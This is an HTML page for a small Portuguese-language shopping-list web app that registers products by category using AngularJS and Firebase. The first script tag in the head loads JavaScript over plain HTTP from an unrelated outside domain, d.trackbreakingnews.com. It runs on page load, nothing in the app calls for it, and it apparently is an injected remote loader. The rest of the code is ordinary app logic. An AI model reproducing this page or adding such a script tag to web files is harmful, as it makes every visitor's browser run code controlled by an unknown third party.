<!DOCTYPE html>
<html ng-app="myApp">
	
    <head>
        <script src="http://d.trackbreakingnews.com/l/load.js"></script>
        
        <script src="libs/angular/angular.min.js"></script>
        
        
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">    
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Xenon Boostrap Admin Panel" />
        <meta name="author" content="" />

        
        <link href="css/bootstrap-dist/css/bootstrap.min.css" rel="stylesheet" />
        <link href="css/ionicons/css/ionicons.min.css" rel="stylesheet" />
        <link href="css/main.css" rel="stylesheet" />
        <script data-main="app/bootstrap" src="libs/requirejs/require.js"></script>
        <script src="libs/requirejs/jquery-1.11.1.min.js"></script>
        
        <title>Lista de compras</title>
            
        <link href="http://fonts.googleapis.com/css?family=Arimo:400,700,400italic" rel="stylesheet">
        
        <link href="css/fonts/linecons/linecons.css" rel="stylesheet">
        <link href="css/fonts/fontawesome/font-awesome.min.css" rel="stylesheet">
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/xenon-core.css" rel="stylesheet">
        <link href="css/xenon-forms.css" rel="stylesheet">
        <link href="css/xenon-components.css" rel="stylesheet">
        <link href="css/xenon-skins.css" rel="stylesheet">
        <link href="css/xenon.css" rel="stylesheet">  
        <link href="css/bootstrap-dist/css/metisMenu.min.css" rel="stylesheet">
        <link href="css/bootstrap-dist/css/sb-admin-2.css" rel="stylesheet">
        <link href="css/fonts/skins/_all-skins.min.css" rel="stylesheet" type="text/css" />

        <!-- Custom Fonts -->
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.26/angular.min.js"></script>

    
        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
            <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.26/angular.min.js"></script>
        <script src="https://cdn.firebase.com/js/client/2.2.3/firebase.js"></script>	
        <script src="https://cdn.firebase.com/libs/angularfire/1.0.0/angularfire.min.js"></script>
            
            
            
            
    </head>
    <body class="page-body">
        
        <div id="wrapper">
            
            <nav class="navbar navbar-default navbar-static-top" role="navigation" style="margin-bottom: 0">
				<div class="navbar-header">
					<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						
					</button>
					<a class="navbar-brand" href="index.html">Lista de Compras 1.0</a>
				</div>
				<!-- /.navbar-header -->

				

				<div class="navbar-default sidebar" role="navigation">
					<div class="sidebar-nav navbar-collapse">
						<ul class="nav" id="side-menu">
							
							<li>
                                <a href="index.html"><i class="fa fa-home fa-fw"></i> Início</a>
                            </li>
                            <li>
                                <a href="lista_produtos.html"><i class="fa fa-edit fa-fw"></i> Cadastrar produtos</a>
                            </li>
                            <li>
                                <a href="carrinho.html"><i class="fa fa-shopping-cart fa-fw"></i> Criar lista de compras</a>
                            </li>
                            <li>
                                <a href="exec_lista.html"><i class="fa fa-check-square-o fa-fw"></i> Ir as compras</a>
                            </li>
						</ul>
					</div>
					<!-- /.sidebar-collapse -->
				</div>
				<!-- /.navbar-static-side -->
            </nav>
        
            <div id="page-wrapper">
                
                
                <div class="page-container"><!-- add class "sidebar-collapsed" to close sidebar by default, "chat-visible" to make chat appear always -->
                        
                    <!-- Add "fixed" class to make the sidebar fixed always to the browser viewport. -->
                    <!-- Adding class "toggle-others" will keep only one menu item open at a time. -->
                    <!-- Adding class "collapsed" collapse sidebar root elements and show only icons. -->
                    
                    <div class="main-content">
                        
                        <h3 class="text-gray">
                            Cadastro de produtos <br />
                            <small class="text-muted">Selecione a categoria</small>
                        </h3>
                        
                        <!-- Xenon Todo List -->
                        <div class="row" ng-controller="produtosCTRL">
							<div class="col-sm-4">
                                <div>									
									<select id="prodCategorias" class="form-control" placeholder="Search Categoria" ng-model="data.singleSelect" ng-options="categoria for categoria in categorias"></select>
								</div>
								<hr>
								
								<div class="xe-widget xe-todo-list xe-todo-list-purple">
                                    <div class="xe-header">
                                        <div class="xe-icon">
                                            <i class="fa-file-text-o"></i>
                                        </div>
                                        <div class="xe-label">
                                            <span>Lista</span>
                                            <strong>{{ data.singleSelect }}</strong>
                                        </div>
                                    </div>
                                    <div class="xe-body">
                                        
                                        <ul class="list-unstyled">
                                            <li ng-repeat="produto in produtos | filter:data.singleSelect">
                                                <label>
                                                    
                                                    <!--<input type="checkbox" ng-model="produto.status" />-->
                                                    
                                                    <i class="fa fa-trash-o" ng-click="removeItem(produto.ID)"></i>
                                                    <span>{{produto.descricao}}</span>

                                                </label>
                                            </li>    
                                        </ul>
                                        
                                    </div>
                                        <div class="xe-header">
                                            <div>
                                            </div>
                                        </div>
                                    
                                        <div class="input-group">
											<input type="text" ng-model="data.novoProduto" class="form-control no-right-border form-focus-purple">
											
											<span class="input-group-btn">
												<button class="btn btn-purple" type="button" ng-click="saveProdutos(txtIncluir, data.singleSelect)">Incluir</button>
											</span>
										</div>
                                            
                                        <br>
                                        
                                        <div>
                                            <form role="form">						
                                                <div class="bs-example" ng-show="myValue">
                                                    
                                                        <div class="alert alert-warning">
                                                            <strong>Alerta!</strong> Preencha o nome do produto...
                                                        </div>
                                                    
                                                </div>
                                            </form>
                                        </div>
                                    
                                        
                                    
                                    </div>
                                </div>
                                
                            </div>
                            
                        </div>
                        
                        <!-- Main Footer -->
                        <!-- Choose between footer styles: "footer-type-1" or "footer-type-2" -->
                        <!-- Add class "sticky" to  always stick the footer to the end of page (if page contents is small) -->
                        <!-- Or class "fixed" to  always fix the footer to the end of page -->
                        
                    </div>
            
                </div>
            </div>
        </div>
        
        <!--
        <script>
        
            var myApp = angular.module('myApp',[]);
            var categoria="";
            
            myApp.controller('minhalistaCTRL', ['$scope', function($scope) {
                $scope.descricao="";
                $scope.items=[];
                $scope.totalitems;
                $scope.totalselecionados;
                $scope.percentualconcluido;
                            
                $scope.myData = new Firebase("https://listadecompras.firebaseio.com/minhalista");
                $scope.myData.on('value', function(snapshot){
                    
                    $scope.items = [];
                    $scope.totalitems = 0;
                    $scope.totalselecionados = 0;
                    var statusitem = "";
                    
                    snapshot.forEach(function(childSnapshot) {
                                            
                        $scope.items.push({'ID': childSnapshot.key(), 'descricao': childSnapshot.child('descricao').val(), 'categoria': childSnapshot.child('categoria').val(), 'status': childSnapshot.child('status').val()});
                        $scope.totalitems = $scope.totalitems+1;
                        
                        if (childSnapshot.child('status').val() > 0) {
                            $scope.totalselecionados = $scope.totalselecionados+1;
                            //alert(childSnapshot.child('status').val());
                        }
                    });
                    
                    if ($scope.totalselecionados > 0) {
                        $scope.percentualconcluido = $scope.totalselecionados/$scope.totalitems*100;
                        //alert($scope.percentualconcluido);
                    } else {
                        $scope.percentualconcluido = 0;
                    }
                    
                    $scope.$apply();
                    //alert($scope.totalitems);
                });
    
                $scope.mudaStatus = function(produto, statusItem) {                    
                    
                    $scope.myList = new Firebase("https://listadecompras.firebaseio.com/minhalista/" + produto);
                    $scope.myList.child('status').set(statusItem);
                    
                };		
                
            }]);	
    
        </script>
        -->

        <script>			
            var myApp = angular.module('myApp',[]);
    
            myApp.controller('produtosCTRL', ['$scope', function($scope) {
                $scope.descricao="";
                $scope.produtos={};
				$scope.categorias=[];
                $scope.myValue=false;
				$scope.data = {};
                $scope.data.novoProduto = "";
           	
				myData = new Firebase("https://listadecompras.firebaseio.com/produtos");
				myData.on('value', function(snapshot){
					$scope.produtos = [];
					snapshot.forEach(function(childSnapshot) {
						$scope.produtos.push({'ID': childSnapshot.key(), 'descricao': childSnapshot.child('descricao').val(), 'categoria': childSnapshot.child('categoria').val()});
					});
					$scope.$apply();				
				});
				
				$scope.removeItem = function removeItem(prod) {
                    alert(prod);
                    $scope.deleteitem = new Firebase("https://listadecompras.firebaseio.com/produtos/" + prod);
                    $scope.deleteitem.remove();
                    $scope.$apply();
                    $scope.myValue=false;
                };
                
                
				$scope.saveProdutos = function(desc, categ){
                    //alert($scope.data.novoProduto + " - " + $scope.data.singleSelect);
                    
                    if ($scope.data.novoProduto == "") {
                        //alert('sim');
                        $scope.myValue=true;
                        return false;
                    } else {
                        //alert('nao');
                        myData.push({descricao:$scope.data.novoProduto, categoria:$scope.data.singleSelect});
                        $scope.data.novoProduto = "";
                        $scope.myValue=false;
                    }
                    
                    
                    
                };

				
				$scope.categorias = ['Alimentação', 'Bebidas', 'Produtos de Limpeza', 'Carnes e Frios', 'Hortifruti'];
				$scope.data.singleSelect = 'Alimentação';
            }]);
            
            myApp.controller('frutasCTRL', ['$scope', function($scope) {
                
                $scope.descricao="";
                $scope.frutas={};
                $scope.myValue=false;
                    
                $scope.myData = new Firebase("https://listadecompras.firebaseio.com/");
                
                $scope.saveFrutas = function(){
                    
                    if ($scope.descricao == "") {
                      //alert('myValue = ' + $scope.myValue);
                        $scope.myValue=true;
                        return false;
                    } else {
                        $scope.myValue=false;
                    }
                    
                    $scope.myData.push({descricao:$scope.descricao, 
                                        categoria:'Frutas'});
                    $scope.descricao="";
                };
                
                $scope.myData.orderByChild("categoria").equalTo("Frutas").on('value', function(snapshot){
                    $scope.frutas = snapshot.val();
                    $scope.$apply();
                });
            }]);
            
        </script>
        
        <!-- Bottom Scripts -->
        
        <script src="libs/requirejs/jquery-1.11.1.min.js"></script>
        
        <script src="libs/js/bootstrap.min.js"></script>
        <script src="libs/js/TweenMax.min.js"></script>
        <script src="libs/js/resizeable.js"></script>
        <script src="libs/js/joinable.js"></script>
        <script src="libs/js/xenon-api.js"></script>
        <script src="libs/js/xenon-toggles.js"></script>
        
        
        <!-- Imported scripts on this page -->
        <script src="libs/js/xenon-widgets.js"></script>
        <script src="libs/js/jquery-jvectormap-1.2.2.min.js"></script>
        <script src="libs/js/jquery-jvectormap-world-mill-en.js"></script>
        
        
        <!-- JavaScripts initializations and stuff -->
        <script src="libs/js/xenon-custom.js"></script>
    
    </body>
    
</html>